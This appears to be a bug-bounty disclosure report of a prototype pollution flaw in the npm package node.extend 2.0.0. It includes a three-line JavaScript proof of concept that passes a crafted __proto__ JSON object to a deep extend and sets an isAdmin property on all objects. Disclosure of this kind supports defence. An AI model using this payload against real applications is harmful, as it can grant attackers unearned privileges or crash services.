Summary:

I would like to report a prototype pollution vulnerability in node.extend.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** node.extend
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/node.extend`

# Vulnerability

## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

`node.extend` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
Craft an object of form `{__proto__: {...}}` and send it to `node.extend`:
```javascript
let extend = require('node.extend');
extend(true, {}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
console.log({}.isAdmin); // true
```

# Wrap up

- I contacted the maintainer to let them know: [N]
- I opened an issue in the related repository: [N]

## Impact

Denial of service, possibly more depending on the application.
